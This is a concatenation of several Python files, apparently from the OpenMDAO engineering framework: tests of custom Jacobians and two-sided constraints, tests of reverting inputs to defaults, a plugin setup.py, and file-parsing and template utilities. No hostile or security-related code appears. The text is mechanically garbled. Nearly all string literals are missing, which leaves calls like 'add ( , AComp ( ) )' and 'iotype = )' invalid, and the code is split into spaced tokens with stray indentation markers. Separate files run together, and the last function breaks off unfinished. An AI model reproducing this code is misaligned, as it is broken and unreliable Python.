self . assertEqual ( result [ ] [ 0 ] , 4.1 ) \n 
\n 
~~ def test_custom_jacobian ( self ) : \n 
\n 
~~~ class AComp ( Component ) : \n 
\n 
~~~ x = Array ( [ [ 1.0 , 3.0 ] , [ - 2.0 , 4.0 ] ] , iotype = ) \n 
y = Array ( np . zeros ( ( 2 , 2 ) ) , iotype = ) \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( AComp , self ) . __init__ ( ) \n 
self . J = np . array ( [ [ 3.5 , - 2.5 , 1.5 , 4.0 ] , \n 
[ 4.0 , 2.0 , - 1.1 , 3.4 ] , \n 
[ 7.7 , 6.6 , 4.4 , 1.1 ] , \n 
[ 0.1 , 3.3 , 6.8 , - 5.5 ] ] ) \n 
\n 
~~ def execute ( self ) : \n 
~~~ """ Run arraycomp""" \n 
y = self . J . dot ( self . x . flatten ( ) ) \n 
self . y = y . reshape ( ( 2 , 2 ) ) \n 
\n 
~~ def list_deriv_vars ( self ) : \n 
~~~ """ x and y """ \n 
input_keys = ( , ) \n 
output_keys = ( , ) \n 
return input_keys , output_keys \n 
\n 
~~ def provideJ ( self ) : \n 
~~~ """Analytical first derivatives""" \n 
return self . J \n 
\n 
\n 
~~ ~~ def fake_jac ( ) : \n 
~~~ """ Returns a User-defined Jacobian. The values are\n            totally wrong to facilitate testing. """ \n 
jacs = { } \n 
jacs [ ] = np . array ( [ [ 100.0 , 101 , 102 , 103 ] , \n 
[ 104 , 105 , 106 , 107 ] , \n 
[ 108 , 109 , 110 , 111 ] , \n 
[ 112 , 113 , 114 , 115 ] ] ) \n 
\n 
return jacs \n 
\n 
~~ top = set_as_top ( Assembly ( ) ) \n 
top . add ( , SimpleDriver ( ) ) \n 
top . add ( , AComp ( ) ) \n 
top . driver . workflow . add ( ) \n 
top . driver . add_parameter ( , low = 10 , high = 10 ) \n 
top . driver . add_constraint ( , jacs = fake_jac ) \n 
\n 
# Scipy gmres, inequality constraints \n 
top . _setup ( ) \n 
top . run ( ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - top . comp . J ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - fake_jac ( ) [ ] ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
# Scipy gmres, equality constraints \n 
top . driver . clear_constraints ( ) \n 
top . _pseudo_count = 0 \n 
top . driver . add_constraint ( , jacs = fake_jac ) \n 
top . _setup ( ) \n 
top . run ( ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - top . comp . J ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - fake_jac ( ) [ ] ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
# Scipy gmres, double-sided constraints \n 
top . driver . clear_constraints ( ) \n 
top . _pseudo_count = 0 \n 
top . driver . add_constraint ( , jacs = fake_jac ) \n 
top . _setup ( ) \n 
top . run ( ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - top . comp . J ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - fake_jac ( ) [ ] ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
# Linear GS, equality constraints \n 
top . driver . clear_constraints ( ) \n 
top . _pseudo_count = 0 \n 
top . driver . add_constraint ( , jacs = fake_jac ) \n 
top . driver . gradient_options . lin_solver = \n 
top . _setup ( ) \n 
top . run ( ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - top . comp . J ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - fake_jac ( ) [ ] ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
# Test behavoir \n 
\n 
def fake_jac2 ( ) : \n 
~~~ """ Returns a User-defined Jacobian. The values are\n            totally wrong to facilitate testing. """ \n 
jacs = { } \n 
jacs [ ] = np . array ( [ [ 100.0 , 101 , 102 , 103 ] , \n 
[ 104 , 105 , 106 , 107 ] , \n 
[ 108 , 109 , 110 , 111 ] , \n 
[ 112 , 113 , 114 , 115 ] ] ) \n 
\n 
return jacs \n 
\n 
~~ top . driver . clear_constraints ( ) \n 
top . _pseudo_count = 0 \n 
top . driver . add_constraint ( , jacs = fake_jac2 ) \n 
top . _setup ( ) \n 
top . run ( ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
diff = np . abs ( J - top . comp . J ) \n 
assert_rel_error ( self , diff . max ( ) , 0.0 , 1e-4 ) \n 
\n 
J = top . driver . calc_gradient ( mode = , return_format = ) \n 
J = J [ ] [ ] \n 
J_abs = np . abs ( J ) \n 
assert_rel_error ( self , J_abs . max ( ) , 0.0 , 1e-4 ) \n 
\n 
\n 
\n 
~~ ~~ class Has2SidedConstraintsTestCase ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . asm = set_as_top ( Assembly ( ) ) \n 
self . asm . add ( , Simple ( ) ) \n 
self . asm . add ( , Simple ( ) ) \n 
self . asm . add ( , SimpleUnits ( ) ) \n 
self . asm . add ( , SimpleUnits ( ) ) \n 
\n 
~~ def test_unsupported ( self ) : \n 
~~~ drv = self . asm . add ( , MyDriver ( ) ) \n 
self . asm . run ( ) \n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except AttributeError as err : \n 
~~~ self . assertEqual ( str ( err ) , "driver: Double-sided constraints are not supported on this driver." ~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
\n 
~~ ~~ def test_get_2sided_constraints ( self ) : \n 
~~~ drv = self . asm . add ( , My2SDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . asm . run ( ) \n 
\n 
cons = drv . get_2sided_constraints ( ) \n 
self . assertTrue ( len ( cons ) == 2 ) \n 
con1 = cons [ ] \n 
self . assertEqual ( self . asm . comp1 . a , con1 . evaluate ( self . asm ) [ 0 ] ) \n 
self . assertEqual ( con1 . low , - 44.1 ) \n 
self . assertEqual ( con1 . high , 13.0 ) \n 
con1 = cons [ ] \n 
self . assertEqual ( self . asm . comp1 . c , con1 . evaluate ( self . asm ) [ 0 ] ) \n 
self . assertEqual ( con1 . low , 77.0 ) \n 
self . assertEqual ( con1 . high , 79.0 ) \n 
\n 
cons = drv . get_constraints ( ) \n 
self . assertTrue ( len ( cons ) == 0 ) \n 
\n 
~~ def test_list_constraints ( self ) : \n 
~~~ drv = self . asm . add ( , My2SDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . asm . run ( ) \n 
\n 
cons = drv . list_constraints ( ) \n 
self . assertTrue ( in cons ) \n 
self . assertTrue ( in cons ) \n 
\n 
~~ def test_gradient ( self ) : \n 
~~~ drv = self . asm . add ( , My2SDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . asm . run ( ) \n 
\n 
J = drv . calc_gradient ( inputs = [ ] ) \n 
\n 
# ineq \n 
assert_rel_error ( self , J [ 0 ] [ 0 ] , 2.5 , 1e-5 ) \n 
\n 
# double sided (in order) \n 
assert_rel_error ( self , J [ 1 ] [ 0 ] , 1.0 , 1e-5 ) \n 
assert_rel_error ( self , J [ 2 ] [ 0 ] , 1.0 , 1e-5 ) \n 
assert_rel_error ( self , J [ 3 ] [ 0 ] , 3.0 , 1e-5 ) \n 
\n 
~~ def test_replace ( self ) : \n 
~~~ drv = self . asm . add ( , My2SDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . asm . run ( ) \n 
\n 
self . asm . replace ( , My2SDriver ( ) ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
\n 
\n 
~~ """\nTest for setting input variables back to their default values.\n""" \n 
\n 
import unittest \n 
\n 
from openmdao . main . api import Component , Assembly \n 
from openmdao . main . datatypes . api import Float , List , Array \n 
from numpy import array , zeros \n 
\n 
class MyDefComp ( Component ) : \n 
~~~ f_in = Float ( 3.14 , iotype = ) \n 
f_out = Float ( iotype = ) \n 
arr_in = Array ( [ 1. , 2. , 3. ] , iotype = ) \n 
list_in = List ( value = [ , , ] , iotype = ) \n 
\n 
def execute ( self ) : \n 
~~~ self . f_out = self . f_in + 1. \n 
\n 
~~ ~~ class MyNoDefComp ( Component ) : \n 
~~~ f_in = Float ( iotype = ) \n 
f_out = Float ( iotype = ) \n 
arr_in = Array ( iotype = ) \n 
list_in = List ( iotype = ) \n 
\n 
def execute ( self ) : \n 
~~~ self . f_out = self . f_in + 1. \n 
\n 
\n 
~~ ~~ class SetDefaultsTestCase ( unittest . TestCase ) : \n 
\n 
~~~ def test_set_to_unset_default ( self ) : \n 
~~~ comp = MyNoDefComp ( ) \n 
self . assertEqual ( 0. , comp . f_in ) \n 
comp . f_in = 42. \n 
comp . arr_in = array ( [ 88. , 32. ] ) \n 
comp . list_in = [ 1 , 2 , 3 ] \n 
comp . run ( ) \n 
comp . revert_to_defaults ( ) \n 
# make sure reverting to defaults invalidates our outputs \n 
self . assertEqual ( 0. , comp . f_in ) \n 
self . assertTrue ( all ( zeros ( 0 , ) == comp . arr_in ) ) \n 
self . assertEqual ( [ ] , comp . list_in ) \n 
\n 
~~ def test_set_to_default ( self ) : \n 
~~~ comp = MyDefComp ( ) \n 
self . assertEqual ( 3.14 , comp . f_in ) \n 
comp . f_in = 42. \n 
comp . arr_in = array ( [ 88. , 32. ] ) \n 
self . assertFalse ( array ( [ 1. , 2. , 3. ] ) == comp . arr_in ) \n 
comp . run ( ) \n 
comp . revert_to_defaults ( ) \n 
# make sure reverting to defaults invalidates our outputs \n 
self . assertEqual ( 3.14 , comp . f_in ) \n 
self . assertTrue ( all ( array ( [ 1. , 2. , 3. ] ) == comp . arr_in ) ) \n 
\n 
~~ def test_set_recursive ( self ) : \n 
~~~ asm = Assembly ( ) \n 
asm . add ( , MyDefComp ( ) ) \n 
asm . add ( , MyNoDefComp ( ) ) \n 
self . assertEqual ( 0. , asm . nodefcomp . f_in ) \n 
self . assertEqual ( 3.14 , asm . defcomp . f_in ) \n 
asm . nodefcomp . f_in = 99 \n 
asm . defcomp . f_in = 99 \n 
asm . revert_to_defaults ( ) \n 
self . assertEqual ( 0. , asm . nodefcomp . f_in ) \n 
self . assertEqual ( 3.14 , asm . defcomp . f_in ) \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
\n 
~~ """\nA small example plugin\n""" \n 
from setuptools import setup \n 
\n 
__author__ = \n 
\n 
setup ( \n 
name = , \n 
version = , \n 
description = __doc__ , \n 
author = __author__ , \n 
packages = [ ] , \n 
py_modules = [ ] , \n 
entry_points = """\n    [openmdao.dumbplugins]\n    foo.Comp1Plugin = foo:Comp1Plugin\n    foo.Comp2Plugin = foo:Comp2Plugin\n    """ \n 
) \n 
\n 
"""\nA collection of utilities for file wrapping.\n\nNote: This is a work in progress.\n""" \n 
\n 
import re \n 
\n 
from pyparsing import CaselessLiteral , Combine , OneOrMore , Optional , TokenConverter , Word , nums , oneOf , printables , ParserElement , alphanums \n 
\n 
from numpy import append , array , zeros \n 
\n 
def _getformat ( val ) : \n 
# Returns the output format for a floating point number. \n 
# The general format is used with 16 places of accuracy, except for when \n 
# the floating point value is an integer, in which case a decimal point \n 
# followed by a single zero is used. \n 
\n 
~~~ if int ( val ) == val : \n 
~~~ return "%.1f" \n 
~~ else : \n 
~~~ return "%.16g" \n 
\n 
\n 
~~ ~~ class _SubHelper ( object ) : \n 
~~~ """Replaces file text at the correct word location in a line. This\n    class contains the Helper Function that is passed to re.sub, etc.""" \n 
\n 
def __init__ ( self ) : \n 
\n 
~~~ self . newtext = "" \n 
self . replace_location = 0 \n 
self . current_location = 0 \n 
self . counter = 0 \n 
self . start_location = 0 \n 
self . end_location = 0 \n 
\n 
~~ def set ( self , newtext , location ) : \n 
~~~ """Sets a new word location and value for replacement.""" \n 
\n 
self . newtext = newtext \n 
self . replace_location = location \n 
self . current_location = 0 \n 
\n 
~~ def set_array ( self , newtext , start_location , end_location ) : \n 
~~~ """For an array, sets a new starting location, ending location, and\n        value for replacement.""" \n 
\n 
self . newtext = newtext \n 
self . start_location = start_location \n 
self . end_location = end_location \n 
self . current_location = 0 \n 
\n 
~~ def replace ( self , text ) : \n 
~~~ """This function should be passed to re.sub.\n        Outputs newtext if current_location = replace_location\n        Otherwise, outputs the input text.""" \n 
\n 
self . current_location += 1 \n 
\n 
if self . current_location == self . replace_location : \n 
~~~ if isinstance ( self . newtext , float ) : \n 
~~~ return _getformat ( self . newtext ) % self . newtext \n 
~~ else : \n 
~~~ return str ( self . newtext ) \n 
~~ ~~ else : \n 
~~~ return text . group ( ) \n 
\n 
~~ ~~ def replace_array ( self , text ) : \n 
~~~ """This function should be passed to re.sub.\n        Outputs newtext if current_location = replace_location\n        Otherwise, outputs the input text.""" \n 
\n 
self . current_location += 1 \n 
end = len ( self . newtext ) \n 
\n 
if self . current_location >= self . start_location and self . current_location <= self . end_location and self . counter < end : \n 
~~~ if isinstance ( self . newtext [ self . counter ] , float ) : \n 
~~~ val = self . newtext [ self . counter ] \n 
newval = _getformat ( val ) % val \n 
~~ else : \n 
~~~ newval = str ( self . newtext [ self . counter ] ) \n 
~~ self . counter += 1 \n 
return newval \n 
~~ else : \n 
~~~ return text . group ( ) \n 
\n 
\n 
~~ ~~ ~~ class ToInteger ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into an int.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into an integer.""" \n 
return int ( tokenlist [ 0 ] ) \n 
\n 
~~ ~~ class ToFloat ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into a float.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into a float.""" \n 
return float ( tokenlist [ 0 ] . replace ( , ) ) \n 
\n 
~~ ~~ class ToNan ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into Python nan.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into Python nan.""" \n 
return float ( ) \n 
\n 
~~ ~~ class ToInf ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into Python inf.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into Python inf.""" \n 
return float ( ) \n 
\n 
\n 
\n 
~~ ~~ class InputFileGenerator ( object ) : \n 
~~~ """Utility to generate an input file from a template.\n    Substitution of values is supported. Data is located with\n    a simple API.""" \n 
\n 
def __init__ ( self ) : \n 
\n 
~~~ self . template_filename = [ ] \n 
self . output_filename = [ ] \n 
\n 
self . delimiter = " " \n 
self . reg = re . compile ( ) \n 
\n 
self . data = [ ] \n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def set_template_file ( self , filename ) : \n 
~~~ """Set the name of the template file to be used The template\n        file is also read into memory when this method is called.\n\n        filename: str\n            Name of the template file to be used.""" \n 
\n 
self . template_filename = filename \n 
\n 
templatefile = open ( filename , ) \n 
self . data = templatefile . readlines ( ) \n 
templatefile . close ( ) \n 
\n 
~~ def set_generated_file ( self , filename ) : \n 
~~~ """Set the name of the file that will be generated.\n\n        filename: str\n            Name of the input file to be generated.""" \n 
\n 
self . output_filename = filename \n 
\n 
~~ def set_delimiters ( self , delimiter ) : \n 
~~~ """Lets you change the delimiter that is used to identify field\n        boundaries.\n\n        delimiter: str\n            A string containing characters to be used as delimiters.""" \n 
\n 
self . delimiter = delimiter \n 
self . reg = re . compile ( + delimiter + ) \n 
\n 
~~ def mark_anchor ( self , anchor , occurrence = 1 ) : \n 
~~~ """Marks the location of a landmark, which lets you describe data by\n        relative position. Note that a forward search begins at the old anchor\n        location. If you want to restart the search for the anchor at the file\n        beginning, then call ``reset_anchor()`` before ``mark_anchor``.\n\n        anchor: str\n            The text you want to search for.\n\n        occurrence: integer\n            Find nth instance of text; default is 1 (first). Use -1 to\n            find last occurrence. Reverse searches always start at the end\n            of the file no matter the state of any previous anchor.""" \n 
\n 
if not isinstance ( occurrence , int ) : \n 
~~~ raise ValueError ( "The value for occurrence must be an integer" ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ count = 0 \n 
max_lines = len ( self . data ) \n 
for index in xrange ( self . current_row , max_lines ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only after the anchor. \n 
if count == 0 and self . anchored : \n 
~~~ line = line . split ( anchor ) [ - 1 ] \n 
\n 
~~ if line . find ( anchor ) > - 1 : \n 
\n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ self . current_row += count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ max_lines = len ( self . data ) - 1 \n 
count = max_lines \n 
for index in xrange ( max_lines , - 1 , - 1 ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only before the anchor. \n 
if count == max_lines and self . anchored : \n 
~~~ line = line . split ( anchor ) [ 0 ] \n 
\n 
~~ if line . find ( anchor ) > - 1 : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ self . current_row = count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count -= 1 \n 
~~ ~~ else : \n 
~~~ raise ValueError ( "0 is not valid for an anchor occurrence." ) \n 
\n 
~~ raise RuntimeError ( "Could not find pattern %s in template file %s" % ( anchor , self . template_filename ) ) \n 
\n 
~~ def reset_anchor ( self ) : \n 
~~~ """Resets anchor to the beginning of the file.""" \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def transfer_var ( self , value , row , field ) : \n 
~~~ """Changes a single variable in the template relative to the\n        current anchor.\n\n        row - number of lines offset from anchor line (0 is anchor line).\n        This can be negative.\n\n        field - which word in line to replace, as denoted by delimiter(s)""" \n 
\n 
j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
sub = _SubHelper ( ) \n 
sub . set ( value , field ) \n 
newline = re . sub ( self . reg , sub . replace , line ) \n 
\n 
self . data [ j ] = newline \n 
\n 
~~ def transfer_array ( self , value , row_start , field_start , field_end , \n 
row_end = None , sep = ", " ) : \n 
~~~ """Changes the values of an array in the template relative to the\n        current anchor. This should generally be used for one-dimensional\n        or free form arrays.\n\n        value: float, integer, bool, str\n            Array of values to insert.\n\n        row_start: integer\n            Starting row for inserting the array. This is relative\n            to the anchor, and can be negative.\n\n        field_start: integer\n            Starting field in the given row_start as denoted by\n            delimiter(s).\n\n        field_end: integer\n            The final field the array uses in row_end.\n            We need this to figure out if the template is too small or large\n\n        row_end: integer (optional)\n            Use if the array wraps to cover additional lines.\n\n        sep: integer (optional)\n            Separator to use if we go beyond the template.""" \n 
\n 
# Simplified input for single-line arrays \n 
if row_end == None : \n 
~~~ row_end = row_start \n 
\n 
~~ sub = _SubHelper ( ) \n 
for row in range ( row_start , row_end + 1 ) : \n 
\n 
~~~ j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
if row == row_end : \n 
~~~ f_end = field_end \n 
~~ else : \n 
~~~ f_end = 99999 \n 
~~ sub . set_array ( value , field_start , f_end ) \n 
field_start = 0 \n 
\n 
newline = re . sub ( self . reg , sub . replace_array , line ) \n 
self . data [ j ] = newline \n 
\n 
# Sometimes an array is too large for the example in the template \n 
# This is resolved by adding more fields at the end \n 
~~ if sub . counter < len ( value ) : \n 
~~~ for val in value [ sub . counter : ] : \n 
~~~ newline = newline . rstrip ( ) + sep + str ( val ) \n 
\n 
~~ self . data [ j ] = newline \n 
\n 
# Sometimes an array is too small for the template \n 
# This is resolved by removing fields \n 
~~ elif sub . counter > len ( value ) : \n 
\n 
# TODO - Figure out how to handle this. \n 
\n 
~~~ raise ValueError ( "Array is too small for the template." ) \n 
\n 
~~ self . data [ j ] += "\\n" \n 
\n 
~~ def transfer_2Darray ( self , value , row_start , row_end , field_start , \n 
field_end , sep = ", " ) : \n 
~~~ """Changes the values of a 2D array in the template relative to the\n        current anchor. This method is specialized for 2D arrays, where each\n        row of the array is on its own line.\n\n        value: ndarray\n            Array of values to insert.\n\n        row_start: integer\n            Starting row for inserting the array. This is relative\n            to the anchor, and can be negative.\n\n        row_end: integer\n            Final row for the array, relative to the anchor.\n\n        field_start: integer\n            starting field in the given row_start as denoted by\n            delimiter(s).\n\n        field_end: integer\n            The final field the array uses in row_end.\n            We need this to figure out if the template is too small or large.\n\n        sep: str (optional) (currently unsupported)\n            Separator to append between values if we go beyond the template.""" \n 
\n 
sub = _SubHelper ( ) \n 
i = 0 \n 
for row in range ( row_start , row_end + 1 ) : \n 
\n 
~~~ j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
sub . set_array ( value [ i , : ] , field_start , field_end ) \n 
\n 
newline = re . sub ( self . reg , sub . replace_array , line ) \n 
self . data [ j ] = newline \n 
\n 
sub . current_location = 0 \n 
sub . counter = 0 \n 
i += 1 \n 
\n 
\n 
#        the template line \n 
\n 
~~ ~~ def clearline ( self , row ) : \n 
~~~ """Replace the contents of a row with the newline character.\n\n        row: integer\n            Row number to clear, relative to current anchor.""" \n 
\n 
self . data [ self . current_row + row ] = "\\n" \n 
\n 
~~ def generate ( self ) : \n 
~~~ """Use the template file to generate the input file.""" \n 
\n 
infile = open ( self . output_filename , ) \n 
infile . writelines ( self . data ) \n 
infile . close ( ) \n 
\n 
\n 
~~ ~~ class FileParser ( object ) : \n 
~~~ """Utility to locate and read data from a file.""" \n 
\n 
def __init__ ( self , end_of_line_comment_char = None , full_line_comment_char = None ) : \n 
\n 
~~~ self . filename = [ ] \n 
self . data = [ ] \n 
\n 
self . delimiter = " \\t" \n 
self . end_of_line_comment_char = end_of_line_comment_char \n 
self . full_line_comment_char = full_line_comment_char \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
self . set_delimiters ( self . delimiter ) \n 
\n 
~~ def set_file ( self , filename ) : \n 
~~~ """Set the name of the file that will be generated.\n\n        filename: str\n            Name of the input file to be generated.""" \n 
\n 
self . filename = filename \n 
\n 
inputfile = open ( filename , ) \n 
if not self . end_of_line_comment_char and not self . full_line_comment_char : \n 
~~~ self . data = inputfile . readlines ( ) \n 
~~ else : \n 
~~~ self . data = [ ] \n 
for line in inputfile : \n 
~~~ if line [ 0 ] == self . full_line_comment_char : \n 
~~~ continue \n 
~~ self . data . append ( line . split ( self . end_of_line_comment_char ) [ 0 ] ) \n 
~~ ~~ inputfile . close ( ) \n 
\n 
~~ def set_delimiters ( self , delimiter ) : \n 
~~~ """Lets you change the delimiter that is used to identify field\n        boundaries.\n\n        delimiter: str\n            A string containing characters to be used as delimiters. The\n            default value is \' \\t\', which means that spaces and tabs are not\n            taken as data but instead mark the boundaries. Note that the\n            parser is smart enough to recognize characters within quotes as\n            non-delimiters.""" \n 
\n 
self . delimiter = delimiter \n 
if delimiter != "columns" : \n 
~~~ ParserElement . setDefaultWhitespaceChars ( str ( delimiter ) ) \n 
~~ self . _reset_tokens ( ) \n 
\n 
~~ def mark_anchor ( self , anchor , occurrence = 1 ) : \n 
~~~ """Marks the location of a landmark, which lets you describe data by\n        relative position. Note that a forward search begins at the old anchor\n        location. If you want to restart the search for the anchor at the file\n        beginning, then call ``reset_anchor()`` before ``mark_anchor``.\n\n        anchor: str\n            The text you want to search for.\n\n        occurrence: integer\n            Find nth instance of text; default is 1 (first). Use -1 to\n            find last occurrence. Reverse searches always start at the end\n            of the file no matter the state of any previous anchor.""" \n 
\n 
if not isinstance ( occurrence , int ) : \n 
~~~ raise ValueError ( "The value for occurrence must be an integer" ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ count = 0 \n 
max_lines = len ( self . data ) \n 
for index in xrange ( self . current_row , max_lines ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only after the anchor. \n 
if count == 0 and self . anchored : \n 
~~~ line = line . split ( anchor ) [ - 1 ] \n 
\n 
~~ if anchor in line : \n 
\n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ self . current_row += count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ max_lines = len ( self . data ) - 1 \n 
count = max_lines \n 
for index in xrange ( max_lines , - 1 , - 1 ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only before the anchor. \n 
if count == max_lines and self . anchored : \n 
~~~ line = line . split ( anchor ) [ 0 ] \n 
\n 
~~ if anchor in line : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ self . current_row = count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count -= 1 \n 
~~ ~~ else : \n 
~~~ raise ValueError ( "0 is not valid for an anchor occurrence." ) \n 
\n 
~~ raise RuntimeError ( "Could not find pattern %s in output file %s" % ( anchor , self . filename ) ) \n 
\n 
~~ def reset_anchor ( self ) : \n 
~~~ """Resets anchor to the beginning of the file.""" \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def transfer_line ( self , row ) : \n 
~~~ """Returns a whole line, relative to current anchor.\n\n        row: integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.""" \n 
\n 
return self . data [ self . current_row + row ] . rstrip ( ) \n 
\n 
~~ def transfer_var ( self , row , field , fieldend = None ) : \n 
~~~ """Grabs a single variable relative to the current anchor.\n\n        --- If the delimiter is a set of chars (e.g., ", ") ---\n\n        row: integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.\n\n        field: integer\n            Which word in line to retrieve.\n\n        fieldend - IGNORED\n\n        --- If the delimiter is "columns" ---\n\n        row: integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.\n\n        field: integer\n            Character position to start.\n\n        fieldend: integer (optional)\n            Position of last character to return. If omitted, the end of\n            the line is used.""" \n 
\n 
j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
if self . delimiter == "columns" : \n 
\n 
~~~ if not fieldend : \n 
~~~ line = line [ ( field - 1 ) : ] \n 
~~ else : \n 
~~~ line = line [ ( field - 1 ) : ( fieldend ) ] \n 
\n 
# Let pyparsing figure out if this is a number, and return it \n 
# as a float or int as appropriate \n 
~~ data = self . _parse_line ( ) . parseString ( line ) \n 
\n 
# data might have been split if it contains whitespace. If so, \n 
# just return the whole string \n 
if len ( data ) > 1 : \n 
~~~ return line \n 
~~ else : \n 
~~~ return data [ 0 ] \n 
~~ ~~ else : \n 
~~~ data = self . _parse_line ( ) . parseString ( line ) \n 
return data [ field - 1 ] \n 
\n 
~~ ~~ def transfer_keyvar ( self , key , field , occurrence = 1 , rowoffset = 0 ) : \n 
~~~ """Searches for a key relative to the current anchor and then grabs\n        a field from that line.\n\n        field: integer\n            Which field to transfer. Field 0 is the key.\n\n        occurrence: integer\n            Find nth instance of text; default is 1 (first value\n            field). Use -1 to find last occurance. Position 0 is the key\n            field, so it should not be used as a value for occurrence.\n\n        rowoffset: integer (optional)\n            Optional row offset from the occurrence of key. This can\n            also be negative.\n\n        You can do the same thing with a call to ``mark_anchor`` and ``transfer_var``.\n        This function just combines them for convenience.""" \n 
\n 
if not isinstance ( occurrence , int ) or occurrence == 0 : \n 
~~~ msg = "The value for occurrence must be a nonzero integer" \n 
raise ValueError ( msg ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ row = 0 \n 
for line in self . data [ self . current_row : ] : \n 
~~~ if line . find ( key ) > - 1 : \n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ break \n 
\n 
~~ ~~ row += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ row = - 1 \n 
for line in reversed ( self . data [ self . current_row : ] ) : \n 
~~~ if line . find ( key ) > - 1 : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ break \n 
\n 
~~ ~~ row -= 1 \n 
\n 
~~ ~~ j = self . current_row + row + rowoffset \n 
line = self . data [ j ] \n 
\n 
fields = self . _parse_line ( ) . parseString ( line . replace ( key , "KeyField" ) ) \n 
\n 
return fields [ field ] \n 
\n 
~~ def transfer_array ( self , rowstart , fieldstart , rowend = None , fieldend = None ) : \n 
